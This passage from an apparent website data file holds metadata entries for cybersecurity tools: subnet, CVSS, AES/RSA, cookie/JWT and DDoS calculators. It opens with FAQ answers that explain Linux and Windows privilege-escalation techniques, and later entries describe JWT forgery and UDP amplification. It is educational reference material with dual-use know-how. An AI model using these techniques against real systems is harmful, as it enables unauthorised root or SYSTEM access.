          "When standard GNU Bash starts and detects that its Effective UID (EUID, set to 0 by the SUID bit) does not match its Real UID (RUID, the calling user), it automatically resets EUID back to RUID as a security precaution. Passing '/bin/bash -p' (privileged mode) instructs Bash to preserve the SUID root effective user ID.",
      },
      {
        question: "How do Linux Capabilities (cap_setuid+ep) cause root privilege escalation without SUID?",
        answer:
          "Linux Capabilities break root privileges into granular units. If an administrator grants 'cap_setuid+ep' to an interpreter like /usr/bin/python3 or /usr/bin/node (visible via 'getcap -r / 2>/dev/null'), that binary does not show an 's' in ls -l permissions, yet any user can call os.setuid(0) inside Python to spawn a root shell.",
      },
      {
        question: "What is SeImpersonatePrivilege on Windows and why is it critical?",
        answer:
          "SeImpersonatePrivilege ('Impersonate a client after authentication') is granted by default to local service accounts (LOCAL SERVICE, NETWORK SERVICE, IIS APPPOOL). Tools like PrintSpoofer, RoguePotato, and GodPotato coerce the Windows SYSTEM account to authenticate to a local named pipe or DCOM listener and then impersonate that SYSTEM token to execute arbitrary commands.",
      },
      {
        question: "How does an Unquoted Windows Service Path vulnerability work?",
        answer:
          "If a Windows service binary path contains spaces and is not wrapped in quotation marks (for example, C:\\Program Files\\Custom App\\Service Engine\\srv.exe), the Service Control Manager attempts to execute C:\\Program.exe, then C:\\Program Files\\Custom.exe, and then C:\\Program Files\\Custom App\\Service.exe in order. If a standard user has write permissions to any of those parent directories, placing a payload at that path executes it as SYSTEM on service restart.",
      },
    ],
    related: [
      "reverse-shell-command-generator",
      "smb-snmp-ldap-enumeration-builder",
      "cvss-v4-vulnerability-score-calculator",
      "live-cve-osv-vulnerability-lookup",
    ],
    pillarUrl: "https://www.zerosuniverse.com/what-is-privilege-escalation-attack/",
    pillarTitle: "What is a Privilege Escalation Attack? Vertical vs Horizontal PrivEsc",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "ipv4-ipv6-cidr-subnet-vlsm-calculator",
    name: "IPv4/IPv6 CIDR Subnet Mask, Wildcard & VLSM Calculator",
    category: "cybersecurity",
    h1: "IPv4/IPv6 CIDR Subnet Mask, Wildcard & VLSM Calculator (2026)",
    subhead:
      "Calculate IPv4 and IPv6 network addresses, broadcast boundaries, Cisco ACL wildcard masks, usable host ranges, 32-bit binary bitmaps, and automated VLSM subnet allocations.",
    primaryKeyword: "cidr subnet vlsm calculator",
    secondaryKeywords: [
      "ipv4 subnet mask calculator",
      "vlsm subnetting calculator online",
      "wildcard mask calculator cisco",
      "ipv6 prefix expander compressor",
    ],
    metaTitle: "IPv4/IPv6 CIDR Subnet & VLSM Calculator (2026) — Binary Mask & Wildcard Tool",
    metaDescription:
      "Instant IPv4 and IPv6 CIDR subnetting and Variable Length Subnet Mask (VLSM) calculator. View network/broadcast IPs, usable hosts, Cisco wildcard masks, RFC scope, and 32-bit binary bitmaps.",
    features: [
      {
        title: "Real-Time IPv4 CIDR & 32-Bit Binary Inspector",
        description:
          "Slide from /1 to /32 to inspect color-coded Network vs Host bits, Dotted Decimal netmasks, Hex IP representations, and RFC 1918/6598 address classifications.",
        icon: "Globe",
      },
      {
        title: "Automated Multi-Department VLSM Allocator",
        description:
          "Enter a parent CIDR block (e.g., 192.168.10.0/24) and required host counts per VLAN; the VLSM engine sorts largest-first and packs non-overlapping subnets automatically.",
        icon: "Cpu",
      },
      {
        title: "Cisco ACL / OSPF Wildcard Mask Generator",
        description:
          "Compute exact inverted wildcard masks (e.g., 0.0.0.63 for /26) with ready-to-copy Cisco IOS access-list and Nmap CIDR scan syntax.",
        icon: "Terminal",
      },
      {
        title: "IPv6 128-Bit Expander, Compressor & /64 Planner",
        description:
          "Expand zero-compressed IPv6 addresses (::), compute first/last 128-bit hex boundaries, and calculate how many /64 SLAAC subnets fit inside your /48 or /56 prefix.",
        icon: "Wifi",
      },
    ],
    useCases: [
      {
        title: "Enterprise VLAN & Cloud VPC Architecture",
        description:
          "Partition AWS VPC or Azure VNet /16 and /24 blocks across production, DMZ, database, and management tiers using zero-waste VLSM allocation.",
      },
      {
        title: "Penetration Test Scope & Firewall Rule Verification",
        description:
          "Verify whether a target IP falls inside an authorized customer CIDR scope and generate exact wildcard masks for router ACLs.",
      },
      {
        title: "CCNA, Network+ & CEH Subnetting Exam Validation",
        description:
          "Visualize how borrowing host bits shifts the subnet boundary in binary, including /31 point-to-point links (RFC 3021) and /32 host routes.",
      },
    ],
    howTo: [
      {
        name: "Enter an IPv4 or IPv6 Address and CIDR Prefix",
        text: "Type any IPv4 address (e.g., 10.24.16.140) and select a prefix length (/8 to /32), or switch to IPv6 mode (/1 to /128).",
      },
      {
        name: "Inspect Network, Broadcast, Host Range & Binary Map",
        text: "Review the calculated Network ID, Broadcast IP, First/Last Usable Host, Wildcard Mask, and 32-bit binary octet breakdown.",
      },
      {
        name: "Configure VLSM Sub-Network Host Requirements",
        text: "Add your VLAN names and needed host counts (e.g., Engineering: 50, Servers: 25, WAN P2P: 2) in the VLSM planner.",
      },
      {
        name: "Export the Allocated VLSM Subnet Table",
        text: "Review the waste utilization percentage and copy the non-overlapping CIDR table for your network documentation.",
      },
    ],
    faq: [
      {
        question: "Why do we subtract 2 when calculating usable IPv4 hosts (2^h - 2)?",
        answer:
          "In standard IPv4 subnets (/1 through /30), the very first address (all host bits set to 0) is reserved as the Network Identifier, and the very last address (all host bits set to 1) is reserved as the Directed Broadcast address. Exceptions are /31 point-to-point links (RFC 3021, 2 usable hosts) and /32 single-host routes (1 usable host).",
      },
      {
        question: "How does Variable Length Subnet Masking (VLSM) prevent IP exhaustion?",
        answer:
          "Fixed-length subnetting forces every sub-network to use the same mask (e.g., giving a 2-router WAN link a full /24 of 254 IPs, wasting 252 addresses). VLSM sorts subnets from largest host requirement to smallest and carves progressively smaller prefixes (/26, /27, /30) out of the remaining address space.",
      },
      {
        question: "What is a Wildcard Mask and how is it calculated?",
        answer:
          "A wildcard mask is the bitwise inverse of a subnet mask, used by Cisco IOS Access Control Lists (ACLs) and OSPF network statements, where 0 bits mean 'must match' and 1 bits mean 'ignore'. Subtract each subnet mask octet from 255 (for example, 255.255.255.255 minus 255.255.255.192 (/26) equals 0.0.0.63).",
      },
      {
        question: "Why does IPv6 standardize on a /64 prefix for almost all LAN subnets?",
        answer:
          "IPv6 Stateless Address Autoconfiguration (SLAAC) and EUI-64 interface identifiers require exactly 64 bits for the interface ID portion of the 128-bit address. Additionally, IPv6 eliminates broadcast addresses in favor of multicast, so there is no need to conserve small host prefixes on standard LANs.",
      },
      {
        question: "What are the RFC 1918 private IPv4 address ranges?",
        answer:
          "RFC 1918 reserves three non-routable private IPv4 blocks for internal networks: 10.0.0.0/8 (10.0.0.0 – 10.255.255.255, ~16.77M hosts), 172.16.0.0/12 (172.16.0.0 – 172.31.255.255, ~1.04M hosts), and 192.168.0.0/16 (192.168.0.0 – 192.168.255.255, 65,534 usable hosts across /24s), while 100.64.0.0/10 (RFC 6598) is reserved for Carrier-Grade NAT (CGNAT).",
      },
    ],
    related: [
      "nmap-command-builder",
      "wireshark-tcpdump-filter-builder",
      "ip-asn-os-fingerprint-inspector",
      "arp-mitm-attack-packet-visualizer",
    ],
    pillarUrl: "https://www.zerosuniverse.com/internet-protocol-ip-address/",
    pillarTitle: "What is an IP Address (IPv4 vs IPv6) & Subnetting Guide",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "cvss-v4-vulnerability-score-calculator",
    name: "CVSS v4.0 & v3.1 Vulnerability Severity Score Calculator",
    category: "cybersecurity",
    h1: "CVSS v4.0 & v3.1 Vulnerability Severity Score & Vector Calculator (2026)",
    subhead:
      "Compute official FIRST.org CVSS v3.1 Base/Temporal scores and CVSS v4.0 Vulnerable vs Subsequent System (VC/VI/VA & SC/SI/SA) severity vectors with bi-directional vector string parsing.",
    primaryKeyword: "cvss score calculator",
    secondaryKeywords: [
      "cvss 4.0 calculator online",
      "cvss v3.1 base score vector",
      "vulnerability severity calculator first",
      "cvss 4.0 vs 3.1 comparison",
    ],
    metaTitle: "CVSS v4.0 & v3.1 Score Calculator (2026) — Interactive Vector Builder",
    metaDescription:
      "Calculate CVSS v4.0 and CVSS v3.1 vulnerability severity scores in real time. Parse existing CVSS vector strings, compare Vulnerable vs Subsequent System impacts, and export pentest report badges.",
    features: [
      {
        title: "Dual CVSS v4.0 & CVSS v3.1 Scoring Engines",
        description:
          "Switch between the modern CVSS v4.0 standard (introducing Attack Requirements AT and Vulnerable/Subsequent System impact separation) and the industry-wide CVSS v3.1 formula.",
        icon: "Shield",
      },
      {
        title: "Bi-Directional Vector String Parser",
        description:
          "Paste any `CVSS:4.0/...` or `CVSS:3.1/...` vector string from NVD or a security advisory to immediately populate every metric button and explain the score breakdown.",
        icon: "Code",
      },
      {
        title: "Vulnerable vs Subsequent System Impact Modeling",
        description:
          "Replace CVSS v3's ambiguous Scope (S:U/S:C) toggle with CVSS v4.0's explicit Confidentiality, Integrity, and Availability metrics for both the Vulnerable System (VC/VI/VA) and Subsequent Systems (SC/SI/SA).",
        icon: "Activity",
      },
      {
        title: "Pentest Report Markdown & JSON Exporter",
        description:
          "Copy standardized Markdown severity badges, NVD vector strings, and executive remediation SLA timelines (Critical <24h, High <7d, Medium <30d) for vulnerability reports.",
        icon: "Terminal",
      },
    ],
    useCases: [
      {
        title: "Bug Bounty & Penetration Testing Report Triage",
        description:
          "Justify exact severity ratings for HackerOne, Bugcrowd, or client pentest deliverables with reproducible vector strings and sub-score explanations.",
      },
      {
        title: "CVSS v3.1 to v4.0 Advisory Migration",
        description:
          "Evaluate how vulnerabilities involving race conditions (AT:P) or downstream lateral impact (SC/SI/SA) shift in score between CVSS v3.1 and v4.0.",
      },
      {
        title: "CEH Module 05 & Vulnerability Management SLA Planning",
        description:
          "Combine Base severity metrics with Threat/Exploit Maturity indicators to prioritize patching queues.",
      },
    ],
    howTo: [
      {
        name: "Choose CVSS v4.0 or CVSS v3.1 Mode (or Paste a Vector)",
        text: "Select your scoring standard or paste an existing vector string (e.g., CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N).",
      },
      {
        name: "Configure Exploitability Metrics",
        text: "Set Attack Vector (AV), Attack Complexity (AC), Attack Requirements (AT in v4.0), Privileges Required (PR), and User Interaction (UI).",
      },
      {
        name: "Set Impact Metrics for Target & Downstream Systems",
        text: "Select High, Low, or None for Confidentiality, Integrity, and Availability across the Vulnerable System and (in v4.0) Subsequent Systems.",
      },
      {
        name: "Copy the Calculated Score, Severity Rating & Vector",
        text: "Export the numeric score (0.0–10.0), qualitative rating (None, Low, Medium, High, Critical), and Markdown snippet for your advisory.",
      },
    ],
    faq: [
      {
        question: "What are the biggest changes between CVSS v3.1 and CVSS v4.0?",
        answer:
          "CVSS v4.0 eliminates the confusing single 'Scope (Unchanged/Changed)' toggle and replaces it with distinct Impact metrics for the Vulnerable System (VC/VI/VA) and Subsequent Systems (SC/SI/SA). It also splits Attack Complexity into Attack Complexity (AC) and Attack Requirements (AT), replaces User Interaction's binary None/Required with None/Passive/Active, and renames Temporal metrics to Threat metrics.",
      },
      {
        question: "What does Attack Requirements (AT:P vs AT:N) measure in CVSS v4.0?",
        answer:
          "Attack Requirements (AT) captures deployment or execution prerequisites of the vulnerable component—such as winning a race condition, bypassing ASLR on a non-deterministic heap, or requiring an active Man-in-the-Middle position—separating those preconditions from the attacker's own engineering effort (Attack Complexity).",
      },
      {
        question: "How do Qualitative Severity Ratings map to numeric CVSS scores?",
        answer:
          "Both CVSS v3.1 and v4.0 map numeric scores to five qualitative severity bands: None (0.0), Low (0.1 – 3.9), Medium (4.0 – 6.9), High (7.0 – 8.9), and Critical (9.0 – 10.0).",
      },
      {
        question: "Why does FIRST recommend CVSS-BTE nomenclature instead of using Base scores alone?",
        answer:
          "A CVSS Base score (CVSS-B) reflects intrinsic technical severity assuming worst-case exploitability, which often inflates remediation queues. Combining Base with Threat (Exploit Maturity) and Environmental metrics (CVSS-BTE) reflects whether a public PoC or active in-the-wild exploitation actually exists.",
      },
      {
        question: "How is a Cross-Site Scripting (XSS) vulnerability scored in CVSS v4.0?",
        answer:
          "In a typical Reflected or Stored XSS where the web server hosts the flaw but the victim's browser DOM/session is compromised, the Vulnerable System (the web server itself) often has VC:N/VI:N/VA:N, while the Subsequent System (the user's browser context) receives SC:L/SI:L/SA:N with UI:P (Passive) or UI:A (Active).",
      },
    ],
    related: [
      "live-cve-osv-vulnerability-lookup",
      "linux-windows-privesc-checklist",
      "ceh-practice-exam-simulator",
      "yara-security-headers-generator",
    ],
    pillarUrl: "https://www.zerosuniverse.com/ceh-v12-module-05-vulnerability-analysis/",
    pillarTitle: "CEH Module 05: Vulnerability Analysis & CVSS Scoring Guide",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "pgp-aes-webcrypto-encryption-studio",
    name: "In-Browser AES-256-GCM & RSA Digital Signature Studio",
    category: "cybersecurity",
    h1: "In-Browser AES-256-GCM Encryption & RSA-PSS Digital Signature Studio (2026)",
    subhead:
      "Encrypt and decrypt messages with hardware-accelerated WebCrypto AES-256-GCM (PBKDF2-SHA256 key derivation + 128-bit auth tag) and generate RSA-2048 keypairs for digital signing.",
    primaryKeyword: "aes 256 gcm encryption online",
    secondaryKeywords: [
      "webcrypto aes gcm encrypt decrypt",
      "rsa digital signature verifier online",
      "pbkdf2 sha256 key derivation browser",
      "pgp armored message generator",
    ],
    metaTitle: "AES-256-GCM & RSA Digital Signature Studio (2026) — Zero-Knowledge WebCrypto",
    metaDescription:
      "Encrypt text with authenticated AES-256-GCM and PBKDF2-SHA256 or generate RSA-2048 PEM keypairs to sign and verify messages using your browser's native WebCrypto API.",
    features: [
      {
        title: "Authenticated AES-256-GCM + PBKDF2-SHA256 Engine",
        description:
          "Derives 256-bit keys from your passphrase using 250,000 PBKDF2-SHA256 iterations, a CSPRNG 128-bit salt, and a 96-bit IV with a 128-bit Galois Message Authentication Code (GMAC) tag.",
        icon: "Lock",
      },
      {
        title: "Live Ciphertext Tamper Detection Demo",
        description:
          "Inspect the separated Salt, IV, and Ciphertext+Tag hex components and test how flipping even a single bit in the ciphertext causes AES-GCM authentication to reject decryption.",
        icon: "Shield",
      },
      {
        title: "RSA-PSS 2048-Bit Keypair & Signature Lab",
        description:
          "Generate real PKCS#8 Private and SPKI Public PEM keys in your browser via window.crypto.subtle, sign arbitrary documents, and verify cryptographic non-repudiation.",
        icon: "Key",
      },
      {
        title: "100% Zero-Knowledge Native WebCrypto Execution",
        description:
          "All cryptographic operations execute inside the browser's native C++/Rust SubtleCrypto subsystem—zero passphrases, keys, or plaintexts ever leave your device.",
        icon: "Cpu",
      },
    ],
    useCases: [
      {
        title: "Confidential Credential & Secret Sharing",
        description:
          "Wrap API keys, recovery phrases, or incident notes in an authenticated AES-256-GCM armored block before sending across untrusted chat channels.",
      },
      {
        title: "Cryptographic Integrity & Non-Repudiation Verification",
        description:
          "Sign release checksums or security advisories with an RSA-PSS private key so recipients can mathematically prove the message was not altered in transit.",
      },
      {
        title: "Applied Cryptography Education (AES-GCM vs RSA)",
        description:
          "Observe the architectural difference between symmetric Authenticated Encryption with Associated Data (AEAD) and asymmetric public-key digital signatures.",
      },
    ],
    howTo: [
      {
        name: "Choose AES-256-GCM Symmetric or RSA-PSS Signature Mode",
        text: "Select the Symmetric Encryption tab for passphrase-protected confidentiality or the Asymmetric RSA tab for public/private key signing.",
      },
      {
        name: "Enter Plaintext & Passphrase (or Generate RSA Keys)",
        text: "Provide your message and passphrase (with customizable PBKDF2 iterations) or click Generate 2048-Bit RSA Keypair to mint fresh PEM keys.",
      },
      {
        name: "Encrypt or Sign with Native SubtleCrypto",
        text: "Execute the operation to view the PGP-style armored envelope along with the raw hex Salt, 96-bit Nonce/IV, and Ciphertext breakdown.",
      },
      {
        name: "Verify Decryption or Test Tamper Rejection",
        text: "Switch to Decrypt/Verify mode—or click 'Simulate 1-Bit Tamper'—to verify how AES-GCM and RSA-PSS detect unauthorized modifications.",
      },
    ],
    faq: [
      {
        question: "Why is AES-256-GCM superior to legacy AES-256-CBC?",
        answer:
          "AES-CBC provides confidentiality only and is vulnerable to Padding Oracle attacks (such as POODLE and Lucky13) if not paired with a separate Encrypt-then-MAC (HMAC) construction. AES-256-GCM is an Authenticated Encryption with Associated Data (AEAD) cipher that combines Counter (CTR) mode encryption with a 128-bit Galois field authentication tag (GMAC), guaranteeing both confidentiality and integrity simultaneously.",
      },
      {
        question: "Why must a 96-bit Initialization Vector (IV/Nonce) never be reused with the same AES-GCM key?",
        answer:
          "In AES-GCM, reusing the exact same 96-bit nonce with the same 256-bit key results in a 'nonce reuse catastrophe': an attacker can XOR the two ciphertexts together to cancel out the AES keystream, immediately recovering the XOR of the two plaintexts and forging valid GMAC authentication tags for future messages.",
      },
      {
        question: "How does PBKDF2-SHA256 protect passphrases against GPU brute-forcing?",
        answer:
          "Human passphrases do not have 256 bits of raw entropy. PBKDF2 combines the passphrase with a unique 128-bit random salt (defeating precomputed rainbow tables) and applies HMAC-SHA256 hundreds of thousands of times, multiplying the computational cost required for an attacker to test each password guess.",
      },
      {
        question: "How does PGP combine asymmetric (RSA/ECC) and symmetric (AES) cryptography?",
        answer:
          "Asymmetric algorithms like RSA are mathematically slow and limited in payload size. PGP uses a hybrid cryptosystem: it generates a random one-time 256-bit session key, encrypts the large message body rapidly with AES-256 using that session key, and then encrypts only the tiny 256-bit session key using the recipient's RSA or Curve25519 public key.",
      },
      {
        question: "Are keys or messages generated in this studio sent to a backend server?",
        answer:
          "No. This tool invokes `window.crypto.subtle` directly inside your browser tab. All key material resides exclusively in local volatile RAM and is cleared as soon as you close or refresh the page.",
      },
    ],
    related: [
      "quantum-shors-algorithm-rsa-simulator",
      "brute-force-dictionary-attack-simulator",
      "http-cookie-jwt-session-security-auditor",
      "malware-deobfuscator-cyberchef-lite",
    ],
    pillarUrl: "https://www.zerosuniverse.com/what-is-pretty-good-privacy-pgp/",
    pillarTitle: "What is PGP Encryption, AES-256 & Digital Signatures?",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "http-cookie-jwt-session-security-auditor",
    name: "HTTP Cookie, JWT & Session Hijacking Security Auditor",
    category: "cybersecurity",
    h1: "HTTP Set-Cookie Flag & JWT Session Hijacking Security Auditor (2026)",
    subhead:
      "Audit raw `Set-Cookie` HTTP response headers and JSON Web Tokens (JWT) for missing `HttpOnly`, `Secure`, `SameSite`, `__Host-` prefix rules, `alg: none` bypasses, and session fixation risks.",
    primaryKeyword: "cookie security flags jwt auditor",
    secondaryKeywords: [
      "set-cookie httponly samesite checker",
      "jwt security vulnerabilities scanner",
      "__host- __secure- cookie prefix validator",
      "session hijacking sidejacking test",
    ],
    metaTitle: "HTTP Cookie & JWT Session Security Auditor (2026) — SameSite, HttpOnly & JWT Check",
    metaDescription:
      "Paste Set-Cookie headers or JWT tokens to audit session hijacking risks. Check HttpOnly, Secure, SameSite=Strict/Lax, __Host- prefixes, JWT alg:none, exp lifetime, and sensitive payload claims.",
    features: [
      {
        title: "RFC 6265bis Set-Cookie Header Parser",
        description:
          "Audit multiple Set-Cookie headers simultaneously for Secure, HttpOnly, SameSite (Strict/Lax/None), Domain over-scoping, Path permissiveness, and Max-Age/Expires persistence.",
        icon: "Shield",
      },
      {
        title: "__Host- & __Secure- Cookie Prefix Validator",
        description:
          "Verify strict compliance with browser cookie prefix invariants (__Host- requires Secure, Path=/, and zero Domain attribute to defeat subdomain cookie tossing).",
        icon: "Lock",
      },
      {
        title: "JWT Header, Payload & Signature Vulnerability Inspector",
        description:
          "Decode Base64URL JWT segments offline to flag `alg: none`, weak HS256 symmetric secrets, dangerous `jku`/`x5u`/`kid` injection headers, missing `exp`/`aud` claims, and PII leakage.",
        icon: "Key",
      },
      {
        title: "Hardened Header & Framework Code Generator",
        description:
          "Automatically rewrite vulnerable Set-Cookie headers into hardened RFC-compliant strings ready for Nginx, Express.js, Next.js, and Django.",
        icon: "Code",
      },
    ],
    useCases: [
      {
        title: "Web Application Penetration Testing (OWASP WSTG-SESS)",
        description:
          "Paste HTTP response headers from Burp Suite or Chrome DevTools to generate structured findings on XSS cookie theft, CSRF exposure, and subdomain session fixation.",
      },
      {
        title: "OAuth2 / OIDC JWT Token Architecture Review",
        description:
          "Inspect access and ID tokens to ensure short expiration windows (`exp`), strict algorithm pinning, and zero sensitive secrets in the readable Base64URL payload.",
      },
      {
        title: "Pre-Deployment Cookie Policy Hardening",
        description:
          "Validate that `SameSite=None` third-party cookies always include the mandatory `Secure` attribute so modern Chromium and WebKit browsers do not silently drop them.",
      },
    ],
    howTo: [
      {
        name: "Select Set-Cookie Header Audit or JWT Token Inspector",
        text: "Choose whether to analyze raw HTTP `Set-Cookie:` lines from your browser's Network tab or an encoded `eyJ...` JSON Web Token.",
      },
      {
        name: "Paste Your Header or Token (or Load a Vulnerable Sample)",
        text: "Drop in one or more Set-Cookie headers or a JWT string; the parser evaluates every attribute and claim instantaneously in browser memory.",
      },
      {
        name: "Review the Session Hijacking Risk Score & Attack Vectors",
        text: "Inspect flagged vulnerabilities—such as XSS `document.cookie` theft, CSRF cross-origin POST replay, or subdomain cookie tossing—with severity badges.",
      },
      {
        name: "Copy the Hardened Set-Cookie Header",
        text: "Copy the remediated `__Host-` Set-Cookie string with `Secure; HttpOnly; SameSite=Strict; Path=/` applied.",
      },
    ],
    faq: [
      {
        question: "How does the HttpOnly flag prevent XSS session hijacking?",
        answer:
          "When a session cookie includes the `HttpOnly` directive, the browser still attaches the cookie automatically to HTTP requests, but blocks client-side JavaScript from accessing it via `document.cookie`. This prevents an attacker who achieves Cross-Site Scripting (XSS) from exfiltrating the raw session identifier to an external server.",
      },
      {
        question: "What is the difference between SameSite=Strict, SameSite=Lax, and SameSite=None?",
        answer:
          "`SameSite=Strict` never sends the cookie on cross-site requests (even when a user clicks a link from Google or an email). `SameSite=Lax` (the modern browser default) withholds the cookie on cross-site subrequests (like `<img>` or hidden CSRF `<form>` POSTs) but sends it on top-level safe GET navigations. `SameSite=None` sends the cookie on all cross-site requests and strictly requires the `Secure` attribute.",
      },
      {
        question: "Why should high-security session cookies use the __Host- prefix?",
        answer:
          "Standard cookies are vulnerable to 'cookie tossing' where a compromised sibling subdomain (e.g., dev.example.com) sets a cookie with `Domain=.example.com` that overwrites or shadows the session cookie on `app.example.com`. Browsers enforce that any cookie starting with `__Host-` must be set over HTTPS (`Secure`), must have `Path=/`, and must NOT specify a `Domain` attribute—locking it exclusively to the exact origin host.",
      },
      {
        question: "Are JSON Web Tokens (JWTs) encrypted by default?",
        answer:
          "No. Standard JWTs use JSON Web Signature (JWS), where the Header and Payload are merely Base64URL-encoded JSON strings followed by a cryptographic signature. Anyone who intercepts or views a JWS token can read every claim inside the payload in cleartext unless JSON Web Encryption (JWE) is used.",
      },
      {
        question: "What is the JWT 'alg: none' and RS256-to-HS256 algorithm confusion attack?",
        answer:
          "In an `alg: none` attack, an attacker modifies the JWT header to specify no signature algorithm and strips the signature segment; unpatched libraries accept the forged token as valid. In RS256-to-HS256 confusion, the attacker changes the header from asymmetric `RS256` to symmetric `HS256` and signs the token using the server's public RSA key bytes as the HMAC secret.",
      },
    ],
    related: [
      "yara-security-headers-generator",
      "sqli-xss-payload-encoder-lab",
      "arp-mitm-attack-packet-visualizer",
      "pgp-aes-webcrypto-encryption-studio",
    ],
    pillarUrl: "https://www.zerosuniverse.com/what-is-cookies/",
    pillarTitle: "What Are HTTP Cookies & How Session Hijacking (Sidejacking) Works",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "ddos-pps-bandwidth-waf-calculator",
    name: "DDoS Packet-Per-Second (Mpps), Gbps & WAF Rate-Limit Calculator",
    category: "cybersecurity",
    h1: "DDoS Packet-Per-Second (Mpps), Gbps Bandwidth & WAF Rate-Limit Calculator (2026)",
    subhead:
      "Model L3/L4 volumetric DDoS floods (SYN, UDP amplification, Ethernet framing overhead) and calculate optimal Cloudflare WAF & Nginx burst rate-limiting rules for L7 HTTP floods.",
    primaryKeyword: "ddos pps gbps calculator",
    secondaryKeywords: [
      "packets per second to gbps converter",
      "ethernet wire rate 64 byte mpps",
      "udp amplification factor calculator",
      "cloudflare nginx rate limit generator",
    ],
    metaTitle: "DDoS Mpps to Gbps & WAF Rate-Limit Calculator (2026) — L3/L4/L7 Capacity Tool",
    metaDescription:
      "Convert DDoS Million Packets Per Second (Mpps) to Gbps wire-rate bandwidth including 20-byte Ethernet framing overhead. Simulate DNS/NTP/Memcached amplification and generate Cloudflare/Nginx rate limits.",
    features: [
      {
        title: "True Wire-Rate Mpps ↔ Gbps Converter",
        description:
          "Accounts for the mandatory 20-byte IEEE 802.3 Ethernet Layer-1 overhead (7B Preamble + 1B SFD + 12B Inter-Frame Gap) revealing why 64-byte minimum frames saturate 10GbE at 14.88 Mpps.",
        icon: "Activity",
      },
      {
        title: "UDP Reflection & Amplification Simulator",
        description:
          "Model spoofed-source reflection vectors across DNS (54x), NTP monlist (556.9x), CLDAP (56x), SSDP (30x), and Memcached UDP (51,000x) to see how small botnet uplinks saturate upstream links.",
        icon: "Wifi",
      },
      {
        title: "Router CPU vs Pipe Saturation Bottleneck Analyzer",
        description:
          "Compare attack Gbps and Mpps against your uplink bandwidth and firewall/ASIC packet-forwarding ceiling to pinpoint whether the pipe or state table fails first.",
        icon: "Cpu",
      },
      {
        title: "L7 WAF & Nginx limit_req Rule Generator",
        description:
          "Input your peak legitimate user RPS and burst duration to generate copy-ready Nginx `limit_req_zone` directives and Cloudflare WAF Rate Limiting expressions.",
        icon: "Shield",
      },
    ],
    useCases: [
      {
        title: "Network & Scrubbing Center Capacity Planning",
        description:
          "Determine why a 10 Gbps NIC or stateful firewall drops traffic during a 6.72 Gbps small-packet TCP SYN flood that exceeds 10 Million Packets Per Second.",
      },
      {
        title: "Application Layer (L7) API & Login Rate Limiting",
        description:
          "Calculate safe request-per-second thresholds and burst buckets so flash crowds pass without friction while credential-stuffing and HTTP/2 Rapid Reset floods are throttled.",
      },
      {
        title: "CEH DDoS Architecture & Incident Post-Mortem Analysis",
        description:
          "Translate cloud provider DDoS mitigation reports (Mpps, Gbps, RPS) into exact packet sizes and botnet amplification math.",
      },
    ],
    howTo: [
      {
        name: "Select Attack Vector Preset or Custom Packet Size",
        text: "Choose 64-Byte TCP SYN Flood, DNS Amplification, NTP Monlist, or custom packet length (64 to 1518 bytes) and packet rate (kpps/Mpps).",
      },
      {
        name: "Set Your Uplink Capacity & Firewall Mpps Ceiling",
        text: "Select your network interface speed (1 Gbps, 10 Gbps, 40 Gbps, 100 Gbps) and stateful firewall packet-processing rating.",
      },
      {
        name: "Inspect L2 Payload vs L1 Wire-Rate Bandwidth",
        text: "Compare actual Ethernet wire utilization (including Preamble and Inter-Frame Gap) and check whether your link fails on bandwidth or PPS.",
      },
      {
        name: "Generate L7 Nginx & Cloudflare Rate-Limit Configs",
        text: "Enter your normal per-IP request rate to copy ready-to-deploy `limit_req_zone` and Cloudflare WAF mitigation blocks.",
      },
    ],
    faq: [
      {
        question: "Why is the maximum packet rate of a 10 Gbps Ethernet link 14.88 Mpps for 64-byte packets?",
        answer:
          "Although a minimum Ethernet frame is 64 bytes (512 bits), IEEE 802.3 requires a 7-byte preamble, a 1-byte Start Frame Delimiter (SFD), and a 12-byte minimum Inter-Frame Gap (IFG) between every packet on the wire. That adds 20 bytes (160 bits) of Layer-1 overhead per packet, totaling 84 bytes (672 bits). Dividing 10,000,000,000 bps by 672 bits/packet yields exactly 14,880,952 packets per second (14.88 Mpps).",
      },
      {
        question: "Why do small-packet TCP SYN floods crash firewalls even when bandwidth is under 20%?",
        answer:
          "Routers, load balancers, and stateful firewalls must inspect headers, perform routing lookups, and allocate conntrack state-table entries for every individual packet. A 2 Mpps flood of 64-byte SYN packets consumes only ~1.34 Gbps of wire bandwidth, but easily exhausts CPU interrupts and state tables on hardware rated for high throughput with 1500-byte packets.",
      },
      {
        question: "How does a UDP Reflection and Amplification DDoS attack work?",
        answer:
          "In a reflection/amplification attack, the attacker sends small UDP requests with a spoofed source IP (set to the victim's IP address) to open third-party UDP servers (such as DNS resolvers, NTP servers, or misconfigured Memcached instances). Because UDP has no three-way handshake to verify the source IP, those servers send massive multi-kilobyte responses directly to the victim, multiplying the attacker's bandwidth by 50x to 51,000x.",
      },
      {
        question: "What is the difference between L3/L4 volumetric floods and L7 HTTP floods?",
        answer:
          "L3/L4 attacks (ICMP floods, UDP amplification, TCP SYN floods) target network pipes and TCP/IP stack state tables measured in Gbps and Mpps. L7 attacks complete a valid TCP/TLS handshake and send legitimate-looking HTTP/HTTPS requests (measured in Requests Per Second, RPS) targeting expensive backend database queries, search endpoints, or login APIs.",
      },
      {
        question: "How does BCP38 (RFC 2827) help defeat reflection DDoS attacks?",
        answer:
          "BCP38 is Network Ingress Filtering implemented by ISPs at the network edge. It drops any outbound packet whose source IP address does not belong to the customer's assigned prefix, preventing botnet nodes from spoofing a victim's IP address to trigger UDP reflection.",
      },
    ],
    related: [
      "wireshark-tcpdump-filter-builder",
      "ipv4-ipv6-cidr-subnet-vlsm-calculator",
      "yara-security-headers-generator",
      "arp-mitm-attack-packet-visualizer",
    ],
    pillarUrl: "https://www.zerosuniverse.com/what-is-distributed-denial-of-service-ddos/",
    pillarTitle: "What is a DDoS Attack? L3/L4/L7 Floods & Mitigation Guide",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "brute-force-dictionary-attack-simulator",
    name: "Brute-Force vs Dictionary & Salted Hash Attack Simulator",
    category: "cybersecurity",
    h1: "Brute-Force vs Dictionary, Rule-Based & Salted Hash Attack Simulator (2026)",
    subhead:
